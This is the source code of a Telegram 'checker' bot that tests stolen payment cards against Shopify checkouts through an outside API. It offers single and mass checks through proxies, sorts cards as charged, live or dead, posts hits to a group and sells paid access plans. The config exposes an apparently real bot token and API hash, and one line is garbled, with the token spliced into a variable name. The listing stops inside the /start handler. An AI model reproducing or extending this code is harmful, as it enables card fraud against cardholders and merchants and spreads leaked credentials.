# ============================================================
#  Rowdy Bot — FINAL bot.py
#  • Public plans: Core / Elite / Root
#  • Usernames: clickable, NO @ shown
#  • Emojis: custom animated  ( [❆] stays plain )
# ============================================================

import asyncio, aiohttp, aiofiles, os, random, time, json, re, string
import requests, uuid, base64, hashlib, logging, urllib.parse, html as _html
from datetime import datetime, timedelta, timezone
from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError
from urllib.parse import urlparse, quote, urlunparse, unquote, parse_qs

# ---------- CONFIG ----------
SHOPI_API_URL = 'https://bhikari-production-bf277.up.railway.app/shopify'
API_ID = 30902136
API_HASH = '7b0f10cfb0136dcb3f8f75037ccaf516'
BOT_TOKEN = '9152653579:AAEuo3B5KaPpVjVlQKyZLQBH1Yqnd0Pmnq8 me'
ADMIN_IDS = [7274586878]

BOT_ICON = "[RowdyXChk]"   # plain watermark, no link

DEV_USERNA9152653579:AAEuo3B5KaPpVjVlQKyZLQBH1Yqnd0Pmnq8ME     = "Rowdyking07"
OWNER_USERNAME   = "Rowdyking07"
SUPPORT_USERNAME = "Rowdyking07"

HIT_GROUP_ID    = -1004373675336
LOGS_CHANNEL_ID = -1004373675336
CHAT_GROUP_ID   = -1004373675336
AUTO_PIN_CHARGED = True

FORCE_JOIN_CHANNELS = [
    {"id": LOGS_CHANNEL_ID, "name": "Logs",  "url": "https://t.me/+yJVh37gN3cZiY2Q1"},
    {"id": HIT_GROUP_ID,    "name": "Hits",  "url": "https://t.me/+yJVh37gN3cZiY2Q1"},
    {"id": CHAT_GROUP_ID,   "name": "Chats", "url": "https://t.me/+M5E8Pu5EjAw3MjQ1"},
]

WELCOME_IMAGE_PATH = "start.gif"

# ---------- FILES ----------
PREMIUM_FILE = 'premium.txt'
SITES_1_5_FILE = 'sites_1_5.txt'
SITES_10_20_FILE = 'sites_10_20.txt'
KEYS_FILE = 'keys.json'
BANNED_FILE = 'banned.txt'
PLANS_FILE = 'plans.json'
FEEDBACK_FILE = 'feedback.json'
BOT_STATUS_FILE = 'bot_status.json'
API_CONFIG_FILE = 'api_config.json'
USER_PLANS_FILE = 'user_plans.json'
CREDITS_FILE = 'credits.json'
PROXY_DIR = 'proxies'
os.makedirs(PROXY_DIR, exist_ok=True)

logging.basicConfig(level=logging.WARNING)
bot = None
def is_admin(user_id): return user_id in ADMIN_IDS

# ============================================================
#  USERNAME FORMATTER  —  NO @  |  CLICKABLE  |  SAFE HTML
# ============================================================
def _escape(s):
    return _html.escape(str(s), quote=False)

def format_username(username=None, user_id=None, display=None):
    uname = None
    if username:
        uname = str(username).lstrip("@").strip()
        if not re.fullmatch(r"[A-Za-z0-9_]{3,64}", uname):
            uname = None
    if uname:
        safe_uname = _escape(uname)
        return f'<a href="https://t.me/{safe_uname}">{safe_uname}</a>'
    if user_id:
        try:
            safe_disp = _escape(display if display else "User")
            return f'<a href="tg://user?id={int(user_id)}">{safe_disp}</a>'
        except Exception:
            pass
    return _escape(display if display else "User")

def dev_link():     return format_username(username=DEV_USERNAME,     display="Rowdyking07")
def owner_link():   return format_username(username=OWNER_USERNAME,   display="Rowdyking07")
def support_link(): return format_username(username=SUPPORT_USERNAME, display="Rowdyking07")

# ============================================================
#  CUSTOM EMOJI  —  every emoji animated  ( [❆] excluded )
# ============================================================
E = {
    "✅":"5118861066981344121", "❌":"4956337889593000947",
    "🟢":"5287687594207891363", "🔴":"5287687594207891363",
    "⚠️":"6154263010715111980", "🚫":"4956337889593000947",
    "⚡":"5456140674028019486", "🔥":"6129418815341077483",
    "💥":"5122933683820430249",
    "💎":"5287547831677112267", "💰":"4965219701572503640",
    "👑":"6129792056589031358", "🆓":"5116382939571028928",
    "🎯":"5287547831677112267", "🌟":"5287547831677112267",
    "⭐":"5039644681583985437", "⭐️":"5456140674028019486",
    "🎀":"5384215445373282968",
    "🚩":"5350291836378307462", "🏪":"5350291836378307462",
    "👋":"5411285122215332752", "𐓷":"5287547831677112267",
    "📌":"6154668949549092628", "⚙️":"5339141594471742013",
    "💳":"5447453226498552490", "💠":"5870498447068502918",
    "📝":"5444860552310457690", "🌐":"6129476453802188018",
    "📊":"4911241630633165627", "📦":"6154668949549092628",
    "📋":"5217877998937595307", "⏳":"5215327832040811010",
    "🚀":"6129532640564354033", "💡":"6305559611743146203",
    "📈":"5134457377428341766", "🔢":"5841276284155467413",
    "🔔":"6129652186684070216", "🔍":"5305346287820895195",
    "⏱️":"6334603778326529773", "📩":"6129479035077531636",
    "👤":"4938653911507534983", "📅":"5251435231256272897",
    "🔄":"5454245266305604993", "🏦":"6318864007381911770",
    "🌍":"5287292843763713628", "🔗":"5042101437237036298",
    "📱":"6154589436819541960", "🔐":"5219901967916084168",
    "📢":"6172513793784857602", "👥":"5870684635282814568",
    "🙂":"5287547831677112267", "🔓":"5219901967916084168",
    "🤍":"5287547831677112267", "👛":"4965219701572503640",
}
def premium_emoji(text):
    if not text: return text
    for e, eid in E.items():
        text = text.replace(e, f'<tg-emoji emoji-id="{eid}">{e}</tg-emoji>')
    return text

# ---------- PLAN SYSTEM (3 public plans + internal Free) ----------
PLAN_LIMITS = {
    "Free":  {"mass": 0,      "single": True, "proxy": False, "workers": 5},
    "Core":  {"mass": 1000,   "single": True, "proxy": True,  "workers": 10},
    "Elite": {"mass": 5000, "single": True, "proxy": True,  "workers": 20},
    "Root":  {"mass": 999999, "single": True, "proxy": True,  "workers": 30},
}
VALID_PLANS = ["Core", "Elite", "Root"]     # only these can be generated via /key

def load_json_file(fp, default=None):
    if default is None: default = {}
    if not os.path.exists(fp): return default
    try:
        with open(fp, 'r', encoding='utf-8') as f: return json.load(f)
    except: return default
def save_json_file(fp, data):
    with open(fp, 'w', encoding='utf-8') as f: json.dump(data, f, indent=2)
def get_bot_status(): return load_json_file(BOT_STATUS_FILE, {'status': 'on'}).get('status', 'on')
def set_bot_status(s): save_json_file(BOT_STATUS_FILE, {'status': s})
def load_api_url():
    return load_json_file(API_CONFIG_FILE, {}).get('shopi_api_url', SHOPI_API_URL)
def save_api_url(url): save_json_file(API_CONFIG_FILE, {'shopi_api_url': url})
def get_file_lines(fp):
    if not os.path.exists(fp): return []
    try:
        with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            return [l.strip() for l in f if l.strip()]
    except: return []
def load_banned(): return get_file_lines(BANNED_FILE)
def is_banned(uid): return str(uid) in load_banned()
def load_premium_users(): return get_file_lines(PREMIUM_FILE)
def is_premium(uid): return str(uid) in load_premium_users()
def load_sites_1_5(): return get_file_lines(SITES_1_5_FILE)
def load_sites_10_20(): return get_file_lines(SITES_10_20_FILE)

def get_user_plan(user_id):
    if is_admin(user_id): return "Root"
    plans = load_json_file(USER_PLANS_FILE, {})
    uid = str(user_id)
    if uid not in plans: return "Free"
    data = plans[uid]
    exp = data.get("expires_at")
    if exp:
        try:
            if datetime.fromisoformat(exp) < datetime.now():
                del plans[uid]
                save_json_file(USER_PLANS_FILE, plans)
                return "Free"
        except: pass
    return data.get("plan", "Free")

def set_user_plan(user_id, plan, days):
    if plan not in PLAN_LIMITS: return False
    plans = load_json_file(USER_PLANS_FILE, {})
    expires = (datetime.now() + timedelta(days=days)).isoformat()
    plans[str(user_id)] = {"plan": plan, "expires_at": expires}
    save_json_file(USER_PLANS_FILE, plans)
    return True

def get_mass_limit(user_id): return PLAN_LIMITS.get(get_user_plan(user_id), {}).get("mass", 0)
def can_use_proxy(user_id): return PLAN_LIMITS.get(get_user_plan(user_id), {}).get("proxy", False)
def get_worker_count(user_id): return PLAN_LIMITS.get(get_user_plan(user_id), {}).get("workers", 5)

# ---------- CREDITS ----------
DEFAULT_CREDITS = 50
def get_credits(user_id):
    if is_admin(user_id): return 999999999
    c = load_json_file(CREDITS_FILE, {})
    uid = str(user_id)
    if uid not in c:
        c[uid] = DEFAULT_CREDITS
        save_json_file(CREDITS_FILE, c)
    return c[uid]
def set_credits(user_id, amount):
    c = load_json_file(CREDITS_FILE, {})
    c[str(user_id)] = max(0, int(amount))
    save_json_file(CREDITS_FILE, c)
def deduct_credits(user_id, amount=1):
    if is_admin(user_id): return True
    cur = get_credits(user_id)
    if cur < amount: return False
    set_credits(user_id, cur - amount)
    return True

# ---------- PROXY ----------
def get_user_proxy_file(user_id, gate="shopify"): return os.path.join(PROXY_DIR, f"{user_id}_{gate}.txt")
def load_user_proxies(user_id, gate="shopify"): return get_file_lines(get_user_proxy_file(user_id, gate))
def save_user_proxies(user_id, proxies, gate="shopify"):
    with open(get_user_proxy_file(user_id, gate), 'w', encoding='utf-8') as f:
        for p in proxies: f.write(f"{p}\n")
def get_proxies_for_check(user_id, gate="shopify"): return load_user_proxies(user_id, gate)

def generate_key(n=16): return ''.join(random.choices(string.ascii_uppercase + string.digits, k=n))
def extract_cc(text):
    return [f"{c}|{m}|{'20'+y if len(y)==2 else y}|{cv}" for c, m, y, cv in
            re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)]
def mask_user_id(uid):
    s = str(uid)
    if len(s) <= 6: return s
    return s[:3] + "****" + s[-3:]

async def get_bin_info(card_number):
    try:
        bn = card_number[:6]; to = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=to) as s:
            async with s.get(f'https://bins.antipublic.cc/bins/{bn}') as r:
                if r.status != 200: return ('-',)*7
                d = json.loads(await r.text())
                return (d.get('brand','-'),d.get('type','-'),d.get('level','-'),
                        d.get('bank','-'),d.get('country_name','-'),
                        d.get('country_code','-'),d.get('country_flag',''))
    except: return ('-',)*7

async def get_checker_mention(user_id):
    try:
        ent = await bot.get_entity(user_id)
        uname = getattr(ent, "username", None)
        fname = getattr(ent, "first_name", None)
        return format_username(username=uname, user_id=user_id, display=fname or "User")
    except Exception:
        return format_username(user_id=user_id, display=mask_user_id(user_id))

async def save_user_stats(user_id, success=False):
    f = f"user_{user_id}.json"; d = load_json_file(f, {})
    d['total_checks'] = d.get('total_checks', 0) + 1
    if success: d['successful_checks'] = d.get('successful_checks', 0) + 1
    save_json_file(f, d)

async def create_user_if_not_exists(user_id, username):
    f = f"user_{user_id}.json"
    if not os.path.exists(f):
        save_json_file(f, {
            'user_id': user_id, 'username': username,
            'registered_at': datetime.now().isoformat(),
            'total_checks': 0, 'successful_checks': 0
        })

async def check_bot_status(event): return get_bot_status() == 'off' and not is_admin(event.sender_id)
async def check_banned(event): return is_banned(event.sender_id) and not is_admin(event.sender_id)

# ---------- DEAD-SITE ----------
_DEAD_INDICATORS = (
    'receipt id is empty','handle is empty','product id is empty','tax amount is empty',
    'payment method identifier is empty','invalid url','error in 1st req','error in 1 req','cloudflare',
    'connection failed','timed out','access denied','tlsv1 alert','ssl routines','could not resolve',
    'domain name not found','name or service not known','openssl ssl_connect','empty reply from server',
    'httperror504','http error','timeout','unreachable','ssl error','502','503','504','bad gateway',
    'service unavailable','gateway timeout','network error','connection reset','failed to detect product',
    'failed to create checkout','failed to tokenize card','failed to get proposal data','submit rejected',
    'submit rejected:','handle error','http 404','delivery_delivery_line_detail_changed',
    'delivery_address2_required','url rejected','malformed input','amount_too_small','amount too small',
    'site dead','captcha_required','captcha required','site errors','all products sold out',
    'no_session_token','tokenize_fail','proxy dead','invalid proxy format','no proxy',
    'checkout error','checkout_error','post "https://shop.app','shop.app/checkout',
    'error in 1st','error in 1','could not resolve host','failed to connect','connection refused',
)
def is_dead_site_error(m):
    if not m: return True
    return any(k in str(m).lower() for k in _DEAD_INDICATORS)

def is_real_approved(message):
    if not message: return False
    rl = str(message).lower()
    if is_dead_site_error(message): return False
    real_keywords = ['insufficient','insufficient_funds','bank_insufficient_funds',
                     'cvv','cvc','incorrect_zip','incorrect zip','invalid_cvv',
                     'incorrect_cvv','invalid cvc','incorrect cvc','incorrect_cvc',
                     '3ds','3d secure','authentication_required','three_d_secure','approved']
    return any(k in rl for k in real_keywords)

# ---------- FORCE JOIN ----------
async def is_user_joined(user_id):
    if is_admin(user_id): return True
    if bot is None: return True
    for ch in FORCE_JOIN_CHANNELS:
        try: await bot(GetParticipantRequest(channel=ch["id"], participant=user_id))
        except UserNotParticipantError: return False
        except Exception: continue
    return True

def get_force_join_keyboard():
    return [
        [Button.inline("✅ Verify", b"verify_join", style="success")],
    ]

# ---------- SHOPIFY CHECK ----------
async def check_card(card, site, proxy):
    try:
        if len(card.split('|')) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
        url = f"{SHOPI_API_URL}?site={urllib.parse.quote(site, safe="")}&cc={urllib.parse.quote(card, safe="")}&proxy={urllib.parse.quote(proxy, safe="")}" if proxy else f"{SHOPI_API_URL}?site={urllib.parse.quote(site, safe="")}&cc={urllib.parse.quote(card, safe="")}"
        to = aiohttp.ClientTimeout(total=25)
        async with aiohttp.ClientSession(timeout=to) as s:
            async with s.get(url) as r:
                raw = await r.json(content_type=None)
        msg = raw.get('Response', ''); price = raw.get('Price', '-')
        gate = raw.get('Gate', 'Shopify Payments')
        charged = str(raw.get('Charged', 'False')).lower() == 'true'
        approved = str(raw.get('Approved', 'False')).lower() == 'true'
        rl = str(msg).lower()
        # PROXY_ERROR from API — retry with different proxy, don't mark site dead
        proxy_field = str(raw.get('Proxy', '')).lower()
        if proxy_field == 'dead' or 'proxy_error' in rl or msg == 'PROXY_ERROR':
            return {'status': 'Site Error', 'message': 'Proxy dead', 'card': card, 'retry': True,
                    'site': site, 'gateway': gate, 'price': price, 'dead_site': False}
        # 429 rate limit — retry with different site+proxy
        if '429' in str(msg) or 'rate limit' in rl or 'too many requests' in rl:
            return {'status': 'Site Error', 'message': msg, 'card': card, 'retry': True,
                    'site': site, 'gateway': gate, 'price': price, 'dead_site': False}
        if is_dead_site_error(msg):
            return {'status': 'Site Error', 'message': msg, 'card': card, 'retry': True,
                    'site': site, 'gateway': gate, 'price': price, 'dead_site': True}
        charged_kw = ['order_placed','order placed','order_completed','order completed',
                      'payment successful','thank you','charged','success',
                      'order_confirmed','order confirmed','order_paid','ORDER_PAID']
        if charged or any(k in rl for k in charged_kw):
            return {'status': 'Charged', 'message': msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        approved_kw = ['approved','insufficient','cvv','cvc','incorrect_zip','incorrect zip',
                       'invalid_cvv','incorrect_cvv','invalid cvc','incorrect cvc','3ds',
                       '3d secure','authentication_required']
        if approved or any(k in rl for k in approved_kw):
            return {'status': 'Approved', 'message': msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        return {'status': 'Dead', 'message': msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True, 'dead_site': True}
    except Exception as e:
        if is_dead_site_error(str(e)):
            return {'status': 'Site Error', 'message': str(e), 'card': card, 'retry': True, 'dead_site': True}
        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=3):
    if not sites: return {'status': 'Dead', 'message': 'No sites', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    last = None
    for i in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies) if proxies else None
        r = await check_card(card, site, proxy)
        if not r.get('retry'): return r
        last = r
        if i < max_retries - 1: await asyncio.sleep(0.2)
    return {'status': 'Dead', 'message': 'Site errors', 'card': card,
            'gateway': last.get('gateway', 'Unknown') if last else 'Unknown',
            'price': last.get('price', '-') if last else '-', 'site': 'Multiple'}

# ---------- OUTPUT: HIT ----------
async def send_hit_to_group(user_id, card, message, gateway, hit_type, price="1 USD"):
    if not HIT_GROUP_ID or HIT_GROUP_ID == -1001234567890: return
    if hit_type == "Approved" and not is_real_approved(message): return
    try:
        try:
            ent = await bot.get_entity(user_id)
            uname = getattr(ent, "username", None)
            fname = getattr(ent, "first_name", None)
            user_link = format_username(username=uname, user_id=user_id, display=fname or "User")
        except Exception:
            user_link = format_username(user_id=user_id, display="User")

        header = "Hit : Charged 💎" if hit_type == "Charged" else "Hit : Live 😗"
        raw_line = (message or "UNKNOWN")[:60]

        hit_msg = (
            f'{BOT_ICON}  <b>{header}</b>\n'
            f'{BOT_ICON}  <b>Gate :</b> {gateway} • {price}\n'
            f'{BOT_ICON}  <b>Raw :</b> <code>{raw_line}</code>\n'
            f'{BOT_ICON}  <b>User :</b> {user_link}'
        )
        hit_msg = premium_emoji(hit_msg)
        await bot.send_message(HIT_GROUP_ID, hit_msg, parse_mode='html', link_preview=False)
    except Exception as e:
        logging.warning(f"Hit group send failed: {e}")

# ---------- OUTPUT: DM RESULT ----------
async def send_check_result(user_id, card, status, message, gateway, price, elapsed, checker_name):
    try:
        bin_info = await get_bin_info(card.split('|')[0])
        brand, ctype, level, bank, country, ccode, flag = bin_info
        titles = {'Charged':'Charged Success ⚡','Approved':'Live Card ⚡','Dead':'Dead ⚡','Error':'Error ⚡'}
        title = titles.get(status, 'Result ⚡')
        result_msg = (
            f'{BOT_ICON} <b>{title}</b>\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'{BOT_ICON} <b>CC</b> ⌁ <code>{card}</code>\n'
            f'{BOT_ICON} <b>Status</b> ⌁ {status}\n'
            f'{BOT_ICON} <b>Result</b> ⌁ {(message or "UNKNOWN")[:60]}\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'{BOT_ICON} <b>BIN</b> ⌁ {brand} · {ctype} · {level}\n'
            f'{BOT_ICON} <b>Bank</b> ⌁ {bank}\n'
            f'{BOT_ICON} <b>Country</b> ⌁ {flag} {country} ({ccode})\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'{BOT_ICON} <b>Gateway</b> ⌁ {gateway}\n'
            f'{BOT_ICON} <b>Amount</b> ⌁ ${price} USD\n'
            f'{BOT_ICON} <b>Time</b> ⌁ {round(elapsed,1)}s\n'
            f'─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n'
            f'{BOT_ICON} <b>Checker</b> ⌁ {checker_name}'
        )
        result_msg = premium_emoji(result_msg)
        sent = await bot.send_message(user_id, result_msg, parse_mode='html', link_preview=False)
        if status == "Charged" and AUTO_PIN_CHARGED:
            try: await bot.pin_message(user_id, sent.id, notify=False)
            except: pass
    except Exception as e:
        logging.warning(f"Check result send failed: {e}")

# ---------- KEY CLAIMED HIT ----------
async def send_key_redeem_hit(user_id, days):
    if not HIT_GROUP_ID or HIT_GROUP_ID == -1001234567890: return
    try:
        try:
            ent = await bot.get_entity(user_id)
            uname = getattr(ent, "username", None)
            fname = getattr(ent, "first_name", None)
            user_link = format_username(username=uname, user_id=user_id, display=fname or "User")
        except Exception:
            user_link = format_username(user_id=user_id, display="User")

        text = (
            f'{BOT_ICON}  <b>Key Claimed 👛</b>\n'
            "────────────\n"
            f'{BOT_ICON}  <b>User ➳</b> {user_link}\n'
            f'{BOT_ICON}  <b>Duration ➳</b> {days}d\n'
            "────────────\n"
            f'{BOT_ICON}  <b>Dev ➳</b> {dev_link()}'
        )
        text = premium_emoji(text)
        await bot.send_message(HIT_GROUP_ID, text, parse_mode='html', link_preview=False)
    except Exception as e:
        logging.warning(f"Key redeem hit failed: {e}")

# ---------- MASS SESSIONS ----------
MASS_SESSIONS = {}

async def build_mass_progress(ar, plan, gateway="Shopify"):
    elapsed = time.time() - ar['start_time']
    mins, secs = divmod(int(elapsed), 60)
    hours, mins = divmod(mins, 60)
    if hours: time_str = f"{hours}H {mins}M {secs}S"
    elif mins: time_str = f"{mins}M {secs}S"
    else: time_str = f"{secs}S"

    text = (
        f"📌 <b>Gate ➳</b> {gateway} Mass\n"
        f"🔥 <b>Progress ➳</b> {ar['checked']}/{ar['total']}\n"
        f"🙂 <b>Live ➳</b> {len(ar['approved'])}\n"
        f"💎 <b>Charged ➳</b> {len(ar['charged'])}\n"
        f"🔔 <b>Dead ➳</b> {len(ar['dead'])}\n"
        f"🔓 <b>Errors ➳</b> {len(ar['error'])}\n"
        f"🤍 <b>Time ➳</b> {time_str}\n"
        f"🚩 <b>User ➳</b> {await get_checker_mention(ar['uid'])}\n"
        f"💠 <b>Dev ➳</b> {dev_link()}"
    )
    return premium_emoji(text)

def get_mass_keyboard():
    return [[Button.inline("Stop", b"mass_stop", style="danger")]]

# ---------- RUNNERS ----------
async def run_shopify_single(event, uid, card, sites):
    proxies = get_proxies_for_check(uid, "shopify")
    if not proxies:
        await event.respond(premium_emoji("❌ Please add proxies first using /addpxy"), parse_mode='html'); return
    if not deduct_credits(uid, 1):
        await event.respond(premium_emoji("❌ Not enough credits."), parse_mode='html'); return
    start_time = time.time()
    sm = await event.respond(premium_emoji(f"⚡ <b>Checking...</b>\n\n<code>{card}</code>"), parse_mode='html')
    try:
        r = await check_card_with_retry(card, sites, proxies, max_retries=3)
        elapsed = time.time() - start_time
        await save_user_stats(uid, success=(r['status'] in ['Charged', 'Approved']))
        checker_name = await get_checker_mention(uid)
        gw = r.get('gateway', 'Shopify Payments'); pr = r.get('price', '0.98')
        if r['status'] == 'Charged':
            await send_hit_to_group(uid, card, r['message'], gw, 'Charged', pr)
            await send_check_result(uid, card, 'Charged', r['message'], gw, pr, elapsed, checker_name)
        elif r['status'] == 'Approved':
            await send_hit_to_group(uid, card, r['message'], gw, 'Approved', pr)
            await send_check_result(uid, card, 'Approved', r['message'], gw, pr, elapsed, checker_name)
        elif r['status'] == 'Site Error':
            await send_check_result(uid, card, 'Error', r['message'], gw, pr, elapsed, checker_name)
        else:
            await send_check_result(uid, card, 'Dead', r['message'], gw, pr, elapsed, checker_name)
        try: await sm.delete()
        except: pass
    except Exception as e:
        try:
            await send_check_result(uid, card, 'Error', str(e)[:80], 'Shopify Payments', '0.98',
                                    time.time() - start_time, await get_checker_mention(uid))
            try: await sm.delete()
            except: pass
        except: await sm.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

async def run_shopify_mass(event, uid, sites, cards):
    plan = get_user_plan(uid); mass_limit = get_mass_limit(uid)
    if mass_limit == 0:
        await bot.send_message(event.chat_id, premium_emoji(f"❌ Your plan ({plan}) does not support Mass Check."), parse_mode='html'); return
    if len(cards) > mass_limit: cards = cards[:mass_limit]
    proxies = get_proxies_for_check(uid, "shopify")
    if not proxies:
        await bot.send_message(event.chat_id, premium_emoji("❌ Please add proxies first using /addpxy"), parse_mode='html'); return
    if not cards:
        await bot.send_message(event.chat_id, premium_emoji("No cards."), parse_mode='html'); return

    workers = get_worker_count(uid)
    session_id = f"{uid}_{int(time.time())}"
    MASS_SESSIONS[session_id] = {"stop": False, "uid": uid}

    ar = {
        'charged': [], 'approved': [], 'dead': [], 'error': [],
        'total': len(cards), 'checked': 0,
        'uid': uid, 'start_time': time.time(), 'session_id': session_id
    }
    q = asyncio.Queue()
    for c in cards: q.put_nowait(c)
    lu = [time.time()]
    checker_name = await get_checker_mention(uid)

    sm = await bot.send_message(
        event.chat_id,
        await build_mass_progress(ar, plan),
        parse_mode='html'
    )

    async def worker():
        while not q.empty():
            if MASS_SESSIONS.get(session_id, {}).get("stop"): break
            try: c = q.get_nowait()
            except: break
            try: r = await check_card_with_retry(c, sites, proxies, max_retries=1)
            except: ar['checked'] += 1; continue
            ar['checked'] += 1
            gw = r.get('gateway', 'Shopify Payments'); pr = r.get('price', '0.98')
            if r['status'] == 'Charged':
                ar['charged'].append(r)
                await send_hit_to_group(uid, r['card'], r['message'], gw, 'Charged', pr)
                await send_check_result(uid, r['card'], 'Charged', r['message'], gw, pr, 0.0, checker_name)
            elif r['status'] == 'Approved':
                ar['approved'].append(r)
                await send_hit_to_group(uid, r['card'], r['message'], gw, 'Approved', pr)
                await send_check_result(uid, r['card'], 'Approved', r['message'], gw, pr, 0.0, checker_name)
            elif r['status'] == 'Site Error':
                ar['error'].append(r)
            else:
                ar['dead'].append(r)
            now = time.time()
            if now - lu[0] >= 3.0 or ar['checked'] == ar['total']:
                lu[0] = now
                try:
                    await sm.edit(
                        await build_mass_progress(ar, plan),
                        buttons=get_mass_keyboard(),
                        parse_mode='html'
                    )
                except: pass

    ws = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*ws)
    MASS_SESSIONS.pop(session_id, None)

    hits = ""
    for r in ar['charged'][:10]: hits += f"💎 <code>{r['card']}</code>\n"
    for r in ar['approved'][:10]: hits += f"⭐ <code>{r['card']}</code>\n"
    if not hits: hits = "No hits"

    result = (
        f"<b>Gate ➳</b> Shopify Charge Mass\n"
        f"<b>Result ➳</b> Live | Charge ⭐\n"
        f"<b>Total ➳</b> {len(ar['charged']) + len(ar['approved'])}\n\n"
        f"{hits}"
    )
    try: await sm.delete()
    except: pass
    await bot.send_message(event.chat_id, premium_emoji(result), parse_mode='html', link_preview=False)

# ---------- UI BUILDERS ----------
def build_main_menu_text(user_id, sender=None):
    plan = get_user_plan(user_id)
    access = "Trial" if plan == "Free" else plan
    credits = get_credits(user_id)
    credits_display = f"{credits:,}" if credits < 100000 else "∞"
    try:
        if sender and sender.username:
            name_line = format_username(username=sender.username)
        elif sender and sender.first_name:
            name_line = format_username(user_id=user_id, display=sender.first_name)
        else:
            name_line = format_username(user_id=user_id, display="User")
    except Exception:
        name_line = format_username(user_id=user_id, display="User")
    uf = load_json_file(f"user_{user_id}.json", {})
    reg = uf.get("registered_at", "")
    joined = reg[:10] if reg else datetime.now().strftime("%Y-%m-%d")
    text = (
        f"{BOT_ICON} <b>Welcome to RowdyXChk Bot ✅</b>\n"
        "────────────\n"
        f"User ➳ <b>{name_line}</b>\n"
        f"User ID ➳ <code>{user_id}</code>\n"
        f"Access ➳ <b>{access}</b>\n"
        f"Credits ➳ <b>{credits_display}</b>\n"
        f"Joined ➳ <b>{joined}</b>\n"
        "────────────\n"
        f"Dev ➳ 🚩 <b>{dev_link()}</b>\n"
        "Version ➳ <b>1.0</b>\n"
        "────────────\n"
        "<b>Choose an option below.</b>"
    )
    return premium_emoji(text)

def get_main_keyboard():
    return [
        [Button.inline("Gate", b"menu_gate", style="primary"),
         Button.inline("Buy", b"menu_buy", style="primary")],
        [Button.inline("Updates", b"menu_updates", style="primary"),
         Button.inline("Support", b"menu_support", style="primary")],
    ]

def get_gate_menu_text():
    return premium_emoji("<b>Gates Status:</b>\nAuth Gates ➳ <b>0</b>\nMass Gates ➳ <b>1</b>\n"
            "Charge Gates ➳ <b>1</b>\nHitter Gates ➳ <b>1</b>\n────────────\n<b>Select a Gate ➳ Category</b>")
def get_gate_menu_keyboard():
    return [
        [Button.inline("Charge", b"gate_charge", style="primary"),
         Button.inline("Hitter", b"gate_hitter", style="danger")],
        [Button.inline("Back", b"main_menu", style="success")],
    ]

def get_charge_menu_text(): return premium_emoji("<b>Select Charge Gate</b>\n────────────\n<b>Shopify •</b>")
def get_charge_menu_keyboard():
    return [
        [Button.inline("Shopify •", b"gate_shopify", style="primary")],
        [Button.inline("Back", b"menu_gate", style="success")],
    ]

def get_shopify_gate_text():
    return premium_emoji("<b>Gate ➳ Shopify</b>\n────────────\n"
            "<b>Command ➳</b> <code>/sp cc|mm|yy|cvv</code>\n"
            "<b>Command ➳</b> <code>/msp</code> reply to txt\n────────────\n"
            "<b>Type ➳ Charge</b>")
def get_shopify_gate_keyboard(): return [[Button.inline("Back", b"gate_charge", style="success")]]

def get_hitter_menu_text():
    return premium_emoji("<b>Select Hitter Gate</b>\n────────────\n"
            "<b>Commands ➳</b> <code>/stco</code> - stripe Chkout\n"
            "<b>Commands ➳</b> <code>/hit</code> - whop")
def get_hitter_menu_keyboard(): return [[Button.inline("Back", b"menu_gate", style="success")]]

def get_buy_menu_text():
    return premium_emoji(
        f"{BOT_ICON} <b>Buy Premium ✅</b>\n"
        "────────────\n"
        "Access ➳ <b>Core ⭐</b>\n"
        "Span ➳ <b>[1 Days]</b>\n"
        "Credits ➳ <b>1000</b>\n"
        "Price ➳ <b>10 USDT</b>\n"
        "────────────\n"
        "Access ➳ <b>Elite ⭐</b>\n"
        "Span ➳ <b>[15 Days]</b>\n"
        "Credits ➳ <b>∞ Unlimited</b>\n"
        "Price ➳ <b>15 USDT</b>\n"
        "────────────\n"
        "Access ➳ <b>Root ⭐</b>\n"
        "Span ➳ <b>[30 Days]</b>\n"
        "Credits ➳ <b>∞ Unlimited</b>\n"
        "Price ➳ <b>30 USDT</b>\n"
        "────────────\n"
        f"Dev ➳ 🏪 <b>{dev_link()}</b>"
    )
def get_buy_menu_keyboard():
    return [
        [Button.inline("Core ⭐", b"buy_core", style="primary"),
         Button.inline("Elite ⭐", b"buy_elite", style="primary")],
        [Button.inline("Root ⭐", b"buy_root", style="danger")],
        [Button.inline("Back", b"main_menu", style="success")],
    ]

# ---------- BOT INIT ----------
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ---------- /start ----------
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = event.sender_id
    if await check_banned(event):
        await event.reply(premium_emoji("🚫 <b>You are banned.</b>"), parse_mode='html'); return
    if await check_bot_status(event):
        await event.reply(premium_emoji("🔴 <b>Bot is OFF.</b>"), parse_mode='html'); return
    if not await is_user_joined(uid):
        text = premium_emoji(
            "<b>Access Locked ⭐</b>\n────────────\n<b>⭐ Join All Three to Unlock</b>\n"
            "<b>🔗 Logs ➳ Checker Logs</b>\n<b>🔗 Hits ➳ Checker Hits</b>\n"
            "<b>🔗 Group ➳ Checker Chat</b>\n────────────\n<b>🔗 All Features Restricted</b>")
        kb = get_force_join_keyboard()
        if os.path.exists(WELCOME_IMAGE_PATH):
            await event.reply(text, file=WELCOME_IMAGE_PATH, buttons=kb, parse_mode='html')
        else:
            await event.reply(text, buttons=kb, parse_mode='html')
        return
